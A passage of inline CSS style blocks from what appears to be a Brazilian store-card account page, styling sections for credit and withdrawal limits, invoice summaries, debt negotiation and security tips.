         .limite-saque .block__header-text {
         line-height: 1; }
         @media (min-width: 1024px) {
         .limite-saque .block__collapsible-toggle {
         display: none; } }
         @media (max-width: 1023px) {
         .limite-saque.collapsible--collapsed .block__header-tooltip {
         display: none; } }
         @media only screen and (min-width: 768px) and (max-width: 997px) {
         .no-margin-bottom-medium {
         margin-bottom: 0 !important; }
         .limite-compra .aviso-bloqueio .tooltip__box {
         top: 4px;
         left: -35px; }
         .limite-compra .aviso-bloqueio .tooltip__box .tooltip__box-link {
         width: 17px;
         height: 17px; }
         .limite-compra .aviso-bloqueio .tooltip__box .tooltip__box-content {
         top: 45px;
         left: -100px; }
         .limite-compra .aviso-bloqueio .tooltip__box .tooltip__box-content:before, .limite-compra .aviso-bloqueio .tooltip__box .tooltip__box-content:after {
         right: inherit;
         -webkit-transform: rotate(-90deg);
         transform: rotate(-90deg); }
         .limite-compra .aviso-bloqueio .tooltip__box .tooltip__box-content:before {
         top: -18px;
         left: 110px; }
         .limite-compra .aviso-bloqueio .tooltip__box .tooltip__box-content:after {
         top: -23px;
         left: 106px; } }
         @media (min-width: 768px) {
         .resumo .loader .loader__invisibility-cloak {
         min-height: 242px; }
         .resumo .loader .loader__invisibility-cloak.resumo__limite-saque {
         min-height: 0; }
         .resumo .gerar-boleto-fatura .loader .loader__invisibility-cloak {
         min-height: 0; }
         .resumo .resumo__acordos .loader .loader__invisibility-cloak,
         .resumo .resumo__dividas .loader .loader__invisibility-cloak {
         min-height: 100px; } }
      </style>
      <style type="text/css">.aviso-acesso-rapido {
         display: -webkit-box;
         display: flex;
         margin: 0 0 1.875rem; }
         @media (max-width: 767px) {
         .aviso-acesso-rapido {
         margin-bottom: 0.625rem; } }
         .aviso-acesso-rapido > :first-child {
         -webkit-box-flex: 1;
         flex: 1; }
         @media (min-width: 1024px) {
         .aviso-acesso-rapido > :first-child {
         margin-right: 30px; } }
         .aviso-acesso-rapido > :first-child .ir-versao-completa {
         height: 100%; }
      </style>
      <style type="text/css">@media (max-width: 767px) {
         .fatura-resumo .block__header-title {
         margin-bottom: 30px; }
         .fatura-resumo .block__header-title:after {
         position: absolute;
         bottom: -10px;
         left: 0;
         background-color: #ebebeb;
         width: 100%;
         height: 1px;
         content: ""; }
         .fatura-resumo .block__header-title .button-ver-detalhes {
         position: absolute;
         top: 50%;
         right: 0;
         -webkit-transform: translateY(-50%);
         transform: translateY(-50%);
         padding: 0;
         height: 40px;
         line-height: 40px;
         font-size: 14px; }
         .fatura-resumo .block__content {
         position: relative; }
         .bloco-resumo-fatura--com-fatura .block__content:after {
         display: block;
         position: absolute;
         top: 0;
         left: 50%;
         margin-left: -5px;
         background-color: #ebebeb;
         width: 1px;
         height: 100%;
         content: ""; }
         .fatura-resumo--um-cartao {
         margin-bottom: 0.625rem; }
         .fatura-resumo--um-cartao .panel > .panel__cell:not(:only-child):not(:last-child) {
         border-bottom: 1px solid #e0e0e0; }
         .fatura-resumo--um-cartao .panel__cell:not(:only-child):first-child {
         border-bottom-left-radius: 3px;
         border-bottom-right-radius: 3px; }
         .cartao-renner .fatura-resumo .button.button--no-style:focus {
         color: #d71920; }
         .meu-cartao .fatura-resumo .button.button--no-style:focus {
         color: #ac8947; } }
         .bloco-faturas {
         margin-bottom: 1.875rem;
         border: 1px solid #e0e0e0;
         border-radius: 3px;
         padding: 0.625rem; }
         @media (min-width: 1024px) and (max-width: 1199px) {
         .bloco-faturas {
         padding: 1rem; }
         .bloco-faturas .fatura-resumo .panel__cell {
         margin: 0; } }
         .bloco-faturas__descricao {
         margin-top: 15px;
         color: #1e1e1f;
         font-size: 14px;
         font-weight: 300; }
         .bloco-faturas__descricao b {
         font-weight: bold; }
         .fatura-dropdown {
         position: relative;
         overflow: hidden;
         text-align: left;
         text-overflow: ellipsis;
         line-height: 38px;
         white-space: nowrap; }
         .fatura-dropdown:after {
         display: inline-block;
         -webkit-transform: rotate(45deg);
         transform: rotate(45deg);
         margin: -6px 3px 0 3px;
         border: solid transparent;
         border-width: 0 2px 2px 0;
         padding: 3px;
         vertical-align: middle;
         content: ""; }
         .fatura-dropdown select {
         position: absolute;
         top: 0;
         left: 0;
         opacity: 0;
         margin: 0;
         border: 0;
         padding: 0;
         width: 100%;
         height: 100%;
         font-size: 16px; }
         .fatura-dropdown select :focus {
         outline: none; }
         .meu-cartao .cartao-renner .fatura-dropdown:after,
         .cartao-renner .fatura-dropdown:after {
         border-color: #d71920; }
         .cartao-renner .meu-cartao .fatura-dropdown:after,
         .meu-cartao .fatura-dropdown:after {
         border-color: #ac8947; }
         .fatura-resumida__block-footer > div:first-child {
         padding-right: 10px; }
         .fatura-resumida__block-footer > div:last-child {
         padding-left: 10px; }
         .fatura--um-cartao .fatura-resumo__fatura-atual.panel__cell {
         border-bottom: 1px solid #e0e0e0 !important;
         border-bottom-left-radius: 3px;
         border-bottom-right-radius: 3px; }
         @media (max-width: 1023px) {
         .fatura-resumo .block__content .column:nth-child(2) {
         padding: 0; }
         .fatura-resumo .block__content .column:nth-child(2) .property__icon {
         margin-right: 8px; } }
      </style>
      <style type="text/css">.resumo__limite-adicionais .block__header {
         -webkit-box-flex: inherit;
         flex-grow: inherit; }
         .resumo__limite-adicionais .block__header .tooltip--left {
         top: 50%;
         right: auto;
         left: auto; }
         .resumo__limite-adicionais .block__header .tooltip--left .tooltip__box {
         margin-top: -6px;
         padding: 10px; }
         .resumo__limite-adicionais .block__header .tooltip--left .tooltip__box-content {
         width: 250px; }
         .resumo__limite-adicionais .block__header .tooltip--left p {
         margin-bottom: 0; }
         .resumo__limite-adicionais .block__content {
         -webkit-box-flex: 1;
         flex-grow: 1;
         margin-top: 30px; }
         .resumo__limite-adicionais .block__adicionais {
         display: -webkit-box;
         display: flex;
         flex-wrap: wrap; }
         .resumo__limite-adicionais .block__adicionais .block__adicional {
         display: -webkit-box;
         display: flex;
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-direction: column;
         margin: 5px 0;
         padding: 0 10px 0 5px;
         width: 100%; }
         .resumo__limite-adicionais .block__adicionais .block__adicional .property {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         -webkit-box-pack: justify;
         justify-content: space-between; }
         .resumo__limite-adicionais .block__adicionais .block__adicional .property .property__label,
         .resumo__limite-adicionais .block__adicionais .block__adicional .property .property__value {
         white-space: nowrap;
         font-size: 16px; }
         .resumo__limite-adicionais .block__adicionais .block__adicional .property .property__label {
         padding-right: 10px;
         overflow: hidden;
         text-overflow: ellipsis; }
         .resumo__limite-adicionais .block__adicionais .block__adicional .property .property__subtitle {
         display: none; }
         .resumo__limite-adicionais .block__adicionais .block__adicional-icon {
         display: inline-block;
         margin-right: 13px;
         width: 14px;
         height: 14px; }
         .resumo__limite-adicionais .meu-cartao .block__tooltip {
         background-color: #ac8947; }
         .resumo__limite-adicionais .cartao-renner .block__tooltip {
         background-color: #d71920; }
         @media (max-width: 767px) {
         .resumo__limite-adicionais .block__adicionais .block__adicional .property .property__label,
         .resumo__limite-adicionais .block__adicionais .block__adicional .property .property__value {
         font-size: 14px; }
         .resumo__limite-adicionais .block__adicionais .block__adicional-name {
         font-size: 12px; }
         .resumo__limite-adicionais .block__header .block__header-title {
         position: relative; }
         .resumo__limite-adicionais .block__header .block__header-title .block__header-tooltip {
         position: absolute;
         z-index: 2;
         margin: 5px; }
         .resumo__limite-adicionais .block__header .block__header-title .tooltip__box-content {
         top: 40px;
         left: -193px; }
         .resumo__limite-adicionais .block__header .block__header-title .tooltip__box-content:after {
         left: auto;
         left: 192px; }
         .resumo__limite-adicionais .block__header .block__header-title .tooltip__box-content:before {
         left: auto;
         left: 190px; }
         .resumo__limite-adicionais .block__header .block__header-title .tooltip__box {
         padding-left: 4px; }
         .resumo__limite-adicionais .block__header .block__header-title .tooltip__box .tooltip__box-link {
         width: 13px;
         height: 13px; }
         .resumo__limite-adicionais .block__header-text {
         line-height: 1; }
         .resumo__limite-adicionais .block__header-tooltip .tooltip__box-content {
         width: 200px; } }
      </style>
      <style type="text/css">.limite-compra-chart {
         display: -webkit-box;
         display: flex;
         position: relative;
         -webkit-box-align: center;
         align-items: center;
         -webkit-box-pack: center;
         justify-content: center;
         width: 110px;
         height: 110px; }
         .limite-compra-chart__info {
         color: gray; }
         .limite-compra-chart__info--icon {
         display: block;
         margin: auto;
         width: 20px;
         height: 20px; }
         .limite-compra-chart__info--desc {
         font-size: 12px; }
         .limite-compra-chart__info__block {
         color: #cf3e3e; }
         .limite-compra-chart__circle-chart {
         position: absolute;
         left: 0;
         width: 100%; }
         .ie .limite-compra-chart__circle-chart {
         top: -20px; }
         @media (max-width: 767px) {
         .limite-compra-chart__info {
         display: -webkit-box;
         display: flex;
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-direction: column; } }
      </style>
      <style type="text/css">.limite-compra {
         display: -webkit-box;
         display: flex;
         -webkit-box-pack: justify;
         justify-content: space-between; }
         .limite-compra__content {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center; }
         .limite-compra .property--limites {
         padding-left: 10px; }
         .limite-compra .property--limites p {
         margin-bottom: 6px; }
         .limite-compra .row-superior {
         margin-top: 12px; }
         .limite-compra .border-bottom-dotted {
         border-bottom: dotted 1px #706f6f; }
         .button_visibility-on svg {
         margin-right: 10px;
         width: 20px;
         -webkit-transform: translateY(20%);
         transform: translateY(20%); }
         .button_visibility-off svg {
         margin-right: 8px;
         width: 22px;
         -webkit-transform: translateY(33%);
         transform: translateY(33%); }
         .limite-none {
         width: 100%; }
         @media (max-width: 767px) {
         .limite-compra__content .limite-compra-chart {
         width: 75px;
         height: 75px; }
         .limite-compra__content .limite-compra-chart .limite-compra-chart__info--icon {
         width: 14px;
         height: 14px; }
         .limite-compra .property--limites {
         padding-left: 0; }
         .limite-compra .property--limites .property p {
         margin-bottom: 0; }
         .limite-compra .property--limites .property__value {
         font-size: 24px; }
         .limite-compra .property--limites .property__subtitle {
         font-size: 12px; }
         .limite-compra .button__loja-virtual {
         margin-top: 30px; }
         .limite-compra .button__loja-virtual.button--outline.button--small {
         height: 40px;
         font-size: 14px;
         font-weight: 500; } }
      </style>
      <style type="text/css">.modal.modal__disponibilidade-simulacao {
         width: 450px; }
         .modal.modal__disponibilidade-simulacao .modal__icon {
         width: 47px;
         height: 47px; }
         .modal.modal__disponibilidade-simulacao .modal__icon-title {
         margin-bottom: 20px;
         text-transform: none;
         font-weight: 900; }
         .modal.modal__disponibilidade-simulacao .modal__content {
         margin-bottom: 30px;
         font-weight: 300; }
         @media (max-width: 767px) {
         .modal.modal__disponibilidade-simulacao {
         padding: 40px;
         width: 300px; }
         .modal.modal__disponibilidade-simulacao .text-center {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-direction: column; }
         .modal.modal__disponibilidade-simulacao .modal__icon {
         width: 36px;
         height: 36px; }
         .modal.modal__disponibilidade-simulacao .modal__icon-title {
         font-size: 22px;
         font-weight: 700; }
         .modal.modal__disponibilidade-simulacao .modal__content {
         margin-bottom: 15px;
         font-size: 14px; } }
      </style>
      <style type="text/css">.limite-saque {
         display: -webkit-box;
         display: flex;
         -webkit-box-pack: justify;
         justify-content: space-between; }
         .limite-saque__tooltip {
         display: -webkit-inline-box;
         display: inline-flex;
         padding-left: 10px;
         color: #706f6f; }
         .limite-saque__tooltip--icon {
         display: block;
         width: 15px;
         height: 15px; }
         .limite-saque__tooltip--buttons {
         display: -webkit-box;
         display: flex;
         -webkit-box-pack: end;
         justify-content: flex-end; }
         .limite-saque .property--limites {
         padding-left: 10px; }
         .limite-saque .property--limites p {
         margin-bottom: 6px; }
         .limite-saque .block__header {
         margin-bottom: 10;
         max-height: 45px; }
         .limite-saque .button--small__saque-rapido {
         border-radius: initial;
         width: 125px;
         height: 30px;
         text-transform: uppercase;
         line-height: 30px; }
         .limite-saque .button__simular-saque {
         margin-top: 30px; }
         @media (min-width: 768px) and (max-width: 1023px) {
         .collapsible--collapsed .limite-saque__tooltip {
         display: none; } }
         @media (max-width: 767px) {
         .limite-saque .property--limites {
         padding: 0; }
         .limite-saque .property--limites p {
         margin-bottom: 0; }
         .limite-saque .property--limites .property .property__value {
         font-size: 24px; }
         .limite-saque .property--limites .property .property__subtitle {
         margin-top: 5px;
         font-size: 12px; }
         .limite-saque .button__simular-saque.button--outline {
         margin-top: 29px;
         height: 40px;
         text-transform: none;
         line-height: 0;
         font-size: 14px;
         font-weight: 500; } }
      </style>
      <style type="text/css">.resumo__utilizado-adicional .block__header {
         -webkit-box-flex: inherit;
         flex-grow: inherit; }
         .resumo__utilizado-adicional .block__header .tooltip--left {
         top: 50%;
         right: auto;
         left: auto; }
         .resumo__utilizado-adicional .block__header .tooltip--left .tooltip__box {
         margin-top: -5px;
         padding: 10px; }
         .resumo__utilizado-adicional .block__header .tooltip--left .tooltip__box-content {
         width: 250px; }
         .resumo__utilizado-adicional .block__header .tooltip--left p {
         margin-bottom: 0; }
         .resumo__utilizado-adicional .block__content {
         -webkit-box-flex: 1;
         flex-grow: 1;
         margin-top: 30px; }
         .resumo__utilizado-adicional .block__adicional {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center; }
         .resumo__utilizado-adicional .block__adicional .block__adicional-name,
         .resumo__utilizado-adicional .block__adicional .block__adicional-limite {
         width: 30%;
         color: #acacac;
         font-size: 14px; }
         .resumo__utilizado-adicional .block__adicional .block__adicional-chart {
         -webkit-box-flex: 1;
         flex-grow: 1;
         margin: 0 10px; }
         .resumo__utilizado-adicional .block__adicional .block__adicional-name {
         overflow: hidden;
         text-overflow: ellipsis;
         white-space: nowrap; }
         .resumo__utilizado-adicional .block__adicional .block__adicional-limite-utilizado {
         color: #706f6f; }
         @media (max-width: 767px) {
         .resumo__utilizado-adicional .block__header .tooltip-wrapper {
         display: inline-block;
         position: relative; }
         .resumo__utilizado-adicional .block__header .tooltip-wrapper .block__header-tooltip {
         position: absolute;
         top: 15px;
         left: 210px; }
         .resumo__utilizado-adicional .block__header .tooltip-wrapper .tooltip__box .tooltip__box-link {
         width: 13px;
         height: 13px; }
         .resumo__utilizado-adicional .block__header .tooltip-wrapper .tooltip__box .tooltip__box-content {
         top: 38px; }
         .resumo__utilizado-adicional .block__header-text {
         line-height: 1; }
         .resumo__utilizado-adicional .block__header-tooltip {
         z-index: 2; }
         .resumo__utilizado-adicional .block__header-tooltip .tooltip__box-content {
         top: 38px;
         left: -187px;
         width: 200px; }
         .resumo__utilizado-adicional .block__header-tooltip .tooltip__box-content:after {
         right: auto;
         left: 7px; }
         .resumo__utilizado-adicional .block__header-tooltip .tooltip__box-content:before {
         right: auto;
         left: 5px; }
         .resumo__utilizado-adicional .block__adicional {
         flex-wrap: wrap;
         -webkit-box-pack: justify;
         justify-content: space-between; }
         .resumo__utilizado-adicional .block__adicional .block__adicional-name,
         .resumo__utilizado-adicional .block__adicional .block__adicional-limite {
         width: 50%;
         font-size: 12px; }
         .resumo__utilizado-adicional .block__adicional .block__adicional-name {
         color: #706f6f; }
         .resumo__utilizado-adicional .block__adicional .block__adicional-limite {
         text-align: right;
         color: #acacac; }
         .resumo__utilizado-adicional .block__adicional .block__adicional-chart {
         -webkit-box-flex: inherit;
         flex-grow: inherit;
         -webkit-box-ordinal-group: 4;
         order: 3;
         margin: 5px 0 15px;
         width: 100%; }
         .resumo__utilizado-adicional .block__adicional .block__adicional-chart .linear-chart .chart__bar,
         .resumo__utilizado-adicional .block__adicional .block__adicional-chart .linear-chart .chart__fill {
         height: 8px; } }
         .resumo__limite-adicionais .block__header {
         -webkit-box-flex: inherit;
         flex-grow: inherit; }
         .resumo__limite-adicionais .block__header .tooltip--left {
         top: 50%;
         right: auto;
         left: auto; }
         .resumo__limite-adicionais .block__header .tooltip--left .tooltip__box {
         margin-top: -6px;
         padding: 10px; }
         .resumo__limite-adicionais .block__header .tooltip--left .tooltip__box-content {
         width: 250px; }
         .resumo__limite-adicionais .block__header .tooltip--left p {
         margin-bottom: 0; }
         .resumo__limite-adicionais .block__content {
         -webkit-box-flex: 1;
         flex-grow: 1;
         margin-top: 30px; }
         .resumo__limite-adicionais .block__adicionais {
         display: -webkit-box;
         display: flex;
         flex-wrap: wrap; }
         .resumo__limite-adicionais .block__adicionais .block__adicional {
         display: -webkit-box;
         display: flex;
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-direction: column;
         margin: 5px 0;
         padding: 0 10px 0 5px;
         width: 100%; }
         .resumo__limite-adicionais .block__adicionais .block__adicional .property {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         -webkit-box-pack: justify;
         justify-content: space-between; }
         .resumo__limite-adicionais .block__adicionais .block__adicional .property .property__label,
         .resumo__limite-adicionais .block__adicionais .block__adicional .property .property__value {
         white-space: nowrap;
         font-size: 16px; }
         .resumo__limite-adicionais .block__adicionais .block__adicional .property .property__label {
         padding-right: 10px;
         overflow: hidden;
         text-overflow: ellipsis; }
         .resumo__limite-adicionais .block__adicionais .block__adicional .property .property__subtitle {
         display: none; }
         .resumo__limite-adicionais .block__adicionais .block__adicional-icon {
         display: inline-block;
         margin-right: 13px;
         width: 14px;
         height: 14px; }
         .resumo__limite-adicionais .meu-cartao .block__tooltip {
         background-color: #ac8947; }
         .resumo__limite-adicionais .cartao-renner .block__tooltip {
         background-color: #d71920; }
         @media (max-width: 767px) {
         .resumo__limite-adicionais .block__adicionais .block__adicional .property .property__label,
         .resumo__limite-adicionais .block__adicionais .block__adicional .property .property__value {
         font-size: 14px; }
         .resumo__limite-adicionais .block__adicionais .block__adicional-name {
         font-size: 12px; }
         .resumo__limite-adicionais .block__header .block__header-title {
         position: relative; }
         .resumo__limite-adicionais .block__header .block__header-title .block__header-tooltip {
         position: absolute;
         z-index: 2;
         margin: 5px; }
         .resumo__limite-adicionais .block__header .block__header-title .tooltip__box-content {
         top: 40px;
         left: -193px; }
         .resumo__limite-adicionais .block__header .block__header-title .tooltip__box-content:after {
         left: auto;
         left: 192px; }
         .resumo__limite-adicionais .block__header .block__header-title .tooltip__box-content:before {
         left: auto;
         left: 190px; }
         .resumo__limite-adicionais .block__header .block__header-title .tooltip__box {
         padding-left: 4px; }
         .resumo__limite-adicionais .block__header .block__header-title .tooltip__box .tooltip__box-link {
         width: 13px;
         height: 13px; }
         .resumo__limite-adicionais .block__header-text {
         line-height: 1; }
         .resumo__limite-adicionais .block__header-tooltip .tooltip__box-content {
         width: 200px; } }
         .resumo-limites__paginacao {
         display: -webkit-box;
         display: flex;
         position: absolute;
         top: 20px;
         right: 20px;
         -webkit-box-align: center;
         align-items: center;
         color: #706f6f; }
         .resumo-limites__paginacao .paginacao__text {
         margin: 0 10px; }
         .resumo-limites__paginacao .paginacao__button {
         cursor: pointer; }
         .resumo-limites__paginacao .paginacao__button:disabled {
         cursor: inherit;
         color: #acacac; }
         .resumo-limites__paginacao .paginacao__button:focus {
         outline: none; }
         .resumo-limites__paginacao .paginacao__button span {
         display: block;
         width: 30px;
         height: 30px; }
         .resumo-limites__publicidade {
         width: 320px; }
         .resumo-limites .scroll__adicionais {
         display: -webkit-box;
         display: flex;
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-direction: column;
         flex-wrap: nowrap;
         height: 246px;
         overflow-x: hidden;
         overflow-y: scroll;
         -ms-overflow-style: none; }
         .resumo-limites .scroll__adicionais::-webkit-scrollbar {
         display: none; }
         .btn_visibility-off {
         display: none; }
         .btn_icon_visibility-on svg {
         margin-left: 10px;
         left: 0;
         width: 35px;
         height: auto; }
         .btn_icon_visibility-off svg {
         margin-left: 10px;
         left: 0;
         width: 35px;
         height: auto; }
         .none {
         color: lightgray; }
         .stripe {
         background-color: #E0E0E0;
         color: #E0E0E0;
         border-radius: 15px;
         -webkit-user-select: none;
         -moz-user-select: none;
         -ms-user-select: none;
         user-select: none;
         padding: 0px 2px 0px 2px; }
         .align_title {
         display: -webkit-box;
         display: flex;
         -webkit-box-pack: justify;
         justify-content: space-between;
         -webkit-box-align: center;
         align-items: center; }
         .align_visibility {
         -webkit-transform: translateY(-8%);
         transform: translateY(-8%);
         margin-bottom: -10px; }
         .tooltip-bottom {
         display: none; }
         .block__tooltip {
         position: absolute;
         bottom: 0;
         left: 5px; }
         @media (max-width: 767px) {
         .resumo-limites .columns {
         width: 100%; }
         .resumo-limites__paginacao {
         top: 12px;
         right: 10px; }
         .resumo-limites__paginacao .paginacao__text {
         margin: 0 5px; }
         .resumo-limites__paginacao .paginacao__button span {
         width: 20px;
         height: 20px; }
         .resumo-limites .not-only-child {
         -webkit-box-flex: 0;
         flex: 0 0 300px; }
         .resumo-limites .panel .panel__cell:not(:only-child):not(:last-child):not(.panel_cell--full-width),
         .resumo-limites .panel .panel__cell:not(:only-child):not(:first-child) {
         border: 1px solid #e0e0e0;
         border-radius: 3px; }
         .resumo-limites .panel .panel__cell:not(:only-child):not(:first-child) {
         margin-left: 10px; }
         .resumo-limites .scroll {
         display: -webkit-box;
         display: flex;
         flex-wrap: nowrap;
         width: 100%;
         overflow-x: scroll;
         overflow-y: hidden;
         -ms-overflow-style: none; }
         .resumo-limites .scroll::-webkit-scrollbar {
         display: none; }
         .resumo-limites .resumo__limite-saque {
         margin-bottom: 0.625rem; }
         .resumo-limites .align_value {
         font-size: 12px;
         display: -webkit-inline-box;
         display: inline-flex;
         -webkit-transform: translateY(-20%);
         transform: translateY(-20%);
         padding-right: 20px; }
         .button-visibility {
         display: none; }
         .btn_visibility-off, .btn_visibility-off svg rect {
         display: inline; }
         .tooltip-top {
         display: none; }
         .tooltip-bottom {
         display: inline-block; } }
         @media (min-width: 768px) and (max-width: 1023px) {
         .resumo-limites .panel .panel__cell:not(:only-child):not(:last-child):not(.panel_cell--full-width),
         .resumo-limites .panel .panel__cell:not(:only-child):not(:first-child) {
         border: 1px solid #e0e0e0;
         border-radius: 3px; } }
      </style>
      <style type="text/css">.resumo__utilizado-adicional .block__header {
         -webkit-box-flex: inherit;
         flex-grow: inherit; }
         .resumo__utilizado-adicional .block__header .tooltip--left {
         top: 50%;
         right: auto;
         left: auto; }
         .resumo__utilizado-adicional .block__header .tooltip--left .tooltip__box {
         margin-top: -5px;
         padding: 10px; }
         .resumo__utilizado-adicional .block__header .tooltip--left .tooltip__box-content {
         width: 250px; }
         .resumo__utilizado-adicional .block__header .tooltip--left p {
         margin-bottom: 0; }
         .resumo__utilizado-adicional .block__content {
         -webkit-box-flex: 1;
         flex-grow: 1;
         margin-top: 30px; }
         .resumo__utilizado-adicional .block__adicional {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center; }
         .resumo__utilizado-adicional .block__adicional .block__adicional-name,
         .resumo__utilizado-adicional .block__adicional .block__adicional-limite {
         width: 30%;
         color: #acacac;
         font-size: 14px; }
         .resumo__utilizado-adicional .block__adicional .block__adicional-chart {
         -webkit-box-flex: 1;
         flex-grow: 1;
         margin: 0 10px; }
         .resumo__utilizado-adicional .block__adicional .block__adicional-name {
         overflow: hidden;
         text-overflow: ellipsis;
         white-space: nowrap; }
         .resumo__utilizado-adicional .block__adicional .block__adicional-limite-utilizado {
         color: #706f6f; }
         @media (max-width: 767px) {
         .resumo__utilizado-adicional .block__header .tooltip-wrapper {
         display: inline-block;
         position: relative; }
         .resumo__utilizado-adicional .block__header .tooltip-wrapper .block__header-tooltip {
         position: absolute;
         top: 15px;
         left: 210px; }
         .resumo__utilizado-adicional .block__header .tooltip-wrapper .tooltip__box .tooltip__box-link {
         width: 13px;
         height: 13px; }
         .resumo__utilizado-adicional .block__header .tooltip-wrapper .tooltip__box .tooltip__box-content {
         top: 38px; }
         .resumo__utilizado-adicional .block__header-text {
         line-height: 1; }
         .resumo__utilizado-adicional .block__header-tooltip {
         z-index: 2; }
         .resumo__utilizado-adicional .block__header-tooltip .tooltip__box-content {
         top: 38px;
         left: -187px;
         width: 200px; }
         .resumo__utilizado-adicional .block__header-tooltip .tooltip__box-content:after {
         right: auto;
         left: 7px; }
         .resumo__utilizado-adicional .block__header-tooltip .tooltip__box-content:before {
         right: auto;
         left: 5px; }
         .resumo__utilizado-adicional .block__adicional {
         flex-wrap: wrap;
         -webkit-box-pack: justify;
         justify-content: space-between; }
         .resumo__utilizado-adicional .block__adicional .block__adicional-name,
         .resumo__utilizado-adicional .block__adicional .block__adicional-limite {
         width: 50%;
         font-size: 12px; }
         .resumo__utilizado-adicional .block__adicional .block__adicional-name {
         color: #706f6f; }
         .resumo__utilizado-adicional .block__adicional .block__adicional-limite {
         text-align: right;
         color: #acacac; }
         .resumo__utilizado-adicional .block__adicional .block__adicional-chart {
         -webkit-box-flex: inherit;
         flex-grow: inherit;
         -webkit-box-ordinal-group: 4;
         order: 3;
         margin: 5px 0 15px;
         width: 100%; }
         .resumo__utilizado-adicional .block__adicional .block__adicional-chart .linear-chart .chart__bar,
         .resumo__utilizado-adicional .block__adicional .block__adicional-chart .linear-chart .chart__fill {
         height: 8px; } }
      </style>
      <style type="text/css">.resumo-mensagem-bloqueio {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         margin-bottom: 30px;
         background: #f2f2f2;
         padding: 10px 15px;
         color: #706f6f;
         font-size: 14px;
         widows: 100%; }
         .resumo-mensagem-bloqueio p {
         margin: 0; }
         .resumo-mensagem-bloqueio__icon {
         display: block;
         margin-right: 15px;
         width: 20px;
         height: 20px; }
         .resumo-mensagem-bloqueio__block {
         background: #cf3e3e;
         color: white; }
         .resumo-mensagem-bloqueio__block .resumo-mensagem-bloqueio__icon {
         width: 26px;
         height: 26px; }
      </style>
      <style type="text/css">.resumo-negociacao {
         margin-bottom: 20px;
         border: 1px solid #e0e0e0;
         padding: 0.625rem; }
         .resumo-negociacao__title {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         margin-bottom: 10px; }
         .resumo-negociacao__title-icon svg {
         margin-right: 10px;
         width: 30px;
         height: 30px; }
         .resumo-negociacao__title-text {
         margin: 0;
         font-weight: 300; }
         .resumo-negociacao__desc {
         margin: 0;
         font-size: 14px;
         font-weight: 300; }
         .resumo-negociacao.com-tab .loading-bar {
         padding-top: 25px; }
         .resumo-negociacao.com-tab .tab-header-item h2 {
         text-transform: none;
         font-size: 18px; }
         .resumo-negociacao.com-tab .tab-header-item .counter {
         display: none; }
         .resumo-negociacao.com-tab .tab-header-item:not(.tab-header-item--active) {
         color: #1e1e1f; }
         .resumo-negociacao.com-tab .tab-header-item:not(.tab-header-item--active) .counter {
         display: block;
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         -webkit-box-pack: center;
         justify-content: center;
         margin-right: 5px;
         border-radius: 100%;
         width: 20px;
         height: 20px;
         color: white;
         font-size: 14px;
         font-weight: 700;
         font-style: unset; }
         .resumo-negociacao.com-tab .resumo-acordos,
         .resumo-negociacao.com-tab .lista-dividas {
         margin-top: 0;
         border-top: none;
         padding-top: 10px; }
         .resumo-negociacao.com-tab .resumo-acordos--header,
         .resumo-negociacao.com-tab .lista-dividas--header {
         display: none; }
         .resumo-negociacao.com-tab .resumo-acordos .resumo-dividas,
         .resumo-negociacao.com-tab .lista-dividas .resumo-dividas {
         padding: 18px 0; }
         .resumo-negociacao.com-tab .resumo-acordos:after,
         .resumo-negociacao.com-tab .lista-dividas:after {
         top: 5px;
         height: 3px; }
         @media (min-width: 768px) {
         .resumo-negociacao {
         padding: 1rem; }
         .resumo-negociacao__title {
         margin-bottom: 15px; }
         .resumo-negociacao__title-text {
         font-size: 22px; }
         .resumo-negociacao__desc {
         font-size: 16px;
         font-weight: 300; } }
      </style>
      <style type="text/css">.layout-static {
         position: relative;
         margin: 30px 0 0;
         padding-bottom: 50px; }
         .dicas-seguranca {
         padding-top: 30px;
         color: #706f6f; }
         .dicas-seguranca h1,
         .dicas-seguranca h2 {
         margin: 0;
         line-height: 100%;
         color: #1e1e1f;
         font-weight: 900; }
         .dicas-seguranca h1 {
         margin-bottom: 10px;
         letter-spacing: -2px;
         font-size: 46px; }
         .dicas-seguranca h2 {
         padding: 35px 0 20px;
         letter-spacing: -0.8px;
         font-size: 22px; }
         .dicas-seguranca p {
         line-height: 24px;
         font-weight: 300; }
         .dicas-seguranca p.voltar--top {
         margin-bottom: 40px; }
         .dicas-seguranca p.voltar--bottom {
         padding-top: 40px; }
         .dicas-seguranca p .link {
         text-decoration: none;
         color: #1e1e1f; }
         .dicas-seguranca p .button {
         padding-right: 20px;
         padding-left: 20px;
         height: 42px;
         line-height: 40px;
         font-size: 16px; }
         .dicas-seguranca p.voltar--top .back-link .icon,
         .dicas-seguranca p.voltar--bottom .back-link .icon {
         color: #d71920; }
         .dicas-seguranca ul li {
         list-style-type: square;
         color: #d71920; }
         .dicas-seguranca ul li p {
         color: #706f6f; }
         @media (max-width: 767px) {
         .dicas-seguranca {
         padding-top: 20px; }
         .dicas-seguranca h1 {
         font-size: 38px; }
         .dicas-seguranca h2 {
         padding-top: 15px;
         font-size: 18px; }
         .dicas-seguranca p {
         font-size: 14px; }
         .dicas-seguranca p.voltar--top {
         margin-bottom: 30px; }
         .dicas-seguranca p.voltar--bottom {
         margin-bottom: 0;
         padding-top: 25px; }
         .dicas-seguranca p .button {
         padding: 10px 20px;
         width: 100%;
         height: auto;
         line-height: 150%;
         white-space: inherit; } }
      </style>
      <style type="text/css">.bottom-sheet__overlay {
         position: fixed;
         top: 0;
         left: 0;
         z-index: 98;
         background: rgba(0, 0, 0, 0.8);
         width: 100vw;
         height: 100vh; }
         .bottom-sheet__content {
         position: fixed;
         right: 0;
         z-index: 99;
